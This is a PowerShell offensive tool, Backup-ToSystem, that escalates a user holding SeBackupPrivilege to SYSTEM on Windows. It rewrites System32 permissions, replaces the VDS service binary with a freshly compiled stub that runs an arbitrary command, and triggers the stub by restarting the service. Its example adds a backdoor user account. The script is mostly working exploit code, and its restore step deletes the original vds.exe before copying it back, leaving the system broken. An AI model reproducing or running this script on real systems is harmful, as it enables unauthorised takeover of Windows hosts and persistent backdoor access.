function Backup-ToSystem {param($command)
$ErrorActionPreference = "SilentlyContinue"
if ($menu -ne $null) {[bool]$colorenable = $true}
$banner = @"
   ___            _               ____  __           _                 
  / __\ __ _  ___| | ___   _ _ __|___ \/ _\_   _ ___| |_ ___ _ __ ___  
 /__\/// _`` |/ __| |/ / | | | '_ \ __) \ \| | | / __| __/ _ \ '_ `` _ \ 
/ \/  \ (_| | (__|   <| |_| | |_) / __/_\ \ |_| \__ \ ||  __/ | | | | |
\_____/\__,_|\___|_|\_\\__,_| .__/_____\__/\__, |___/\__\___|_| |_| |_|
                            |_|            |___/                       
"@
$help = @"
.SYNOPSIS
    Backup to System
    PowerShell Function: Backup-ToSystem
    Author: Luis Vacas (CyberVaca)
    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Backup-ToSystem -command "net user cybervaca CabeshaOwned1 /add"

    Description
    -----------
    We abused the SeBackupPrivilegeprivilege, to change the System32 
    ACLS and modify a binary to trigger it later. 
    We then left the system as it was before the attack.

"@
function Acl-FullControl {param ($user,$path)
$help = @"
.SYNOPSIS
    Acl-FullControl
    PowerShell Function: Acl-FullControl
    Author: Luis Vacas (CyberVaca)

    Required dependencies: None
    Optional dependencies: None
.DESCRIPTION

.EXAMPLE
    Acl-FullControl -user domain\usuario -path c:\users\administrador

    Description
    -----------
    If you have the SeBackupPrivilege privilege. You can change the permissions to the path you select.

"@
if ($user -eq $null -or $path -eq $null) {$help} else {
"[+] Current permissions:"
get-acl $path | fl
"[+] Changing permissions to $path"
$acl = get-acl $path
$aclpermisos = $user,'FullControl','ContainerInherit,ObjectInherit','None','Allow'
$permisoacl = new-object System.Security.AccessControl.FileSystemAccessRule $aclpermisos
$acl.AddAccessRule($permisoacl)
set-acl -Path $path -AclObject $acl
"[+] Acls changed successfully."
get-acl -path $path | fl
$acl = get-acl c:\\programdata
set-acl $path $acl
}
}
function informa-colors {param ($msg) ;$Color = [char]27 ; $RED = "[31m" ;$GREEN = "[92m" ; $END = "[0m"; "$Color$GREEN[$color$RED+$Color$GREEN] " + $msg + "$color$END"} 
function Create-Binary {
$code = @"
using System.Diagnostics;
class Program
{
    static void Main()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "cmd.exe";
        startInfo.Arguments = "/c start ARGUMENTOS";
        Process.Start(startInfo);
    }
}

"@
$code = $code.Replace("ARGUMENTOS",$command)
$code | Out-File -FilePath c:\programdata\temp.cs
Start-Process (ls C:\Windows\Microsoft.NET\Framework -Recurse -file | Where-Object {$_.name -like "csc.exe"} | Select-Object fullname -First 1).fullname -ArgumentList "/t:exe /out:c:\programdata\temp.exe c:\programdata\temp.cs"
do {sleep -Seconds 2} while (((Test-Path c:\programdata\temp.exe) -eq $false ))

}

if ($command -eq $null) {$help} else {
function print-banner {param($banner)$Color = [char]27;$RED = "[31m";$GREEN = "92m";$END = "[0m";"$Color$RED" + $banner + "$Color$end"; "`n                                                   by CyberVaca"}

if ($colorenable -eq $true) {print-banner $banner} else {$banner + "`n                                                   by CyberVaca"}
if ($colorenable -eq $true) {informa-colors "Backup ACL"} else {"[+] Backup ACL" }
$acl_backup = get-acl c:\windows\system32\
if ($colorenable -eq $true) {informa-colors "Changing ACL"} else {"[+] Changing ACL"}
Acl-FullControl -user $env:USERDNSDOMAIN\$env:username -path c:\windows\system32\ | out-null
if ($colorenable -eq $true) {informa-colors "Writing Payload"} else {"[+] Writing Payload"}
get-service vds | Stop-Service  | Out-Null
move c:\windows\system32\vds.exe C:\ProgramData\
Create-Binary
copy c:\programdata\temp.exe c:\windows\system32\vds.exe
if ($colorenable -eq $true) {informa-colors "Trigger Payload"} else {"[+] Trigger Payload"}
get-service vds  | Start-Service | Stop-Service  | Out-Null
sleep -Seconds 5
if ($colorenable -eq $true) {informa-colors "Deleting temp Files"} else {"[+] Deleting temp Files"}
del c:\programdata\temp.cs
del c:\programdata\temp.exe
del c:\programdata\vds.exe

if ($colorenable -eq $true) {informa-colors "Restore files"} else {"[+] Restore files"}
$save_path = Get-Location
Set-Location c:\programdata\ 
copy vds.exe c:\windows\system32
Set-Location $save_path
get-service vds | start-service
if ($colorenable -eq $true) {informa-colors "Restore backup ACL"} else {"[+] Restore backup ACL"}
set-acl -path c:\windows\system32\ $acl_backup
"`n"
}
}

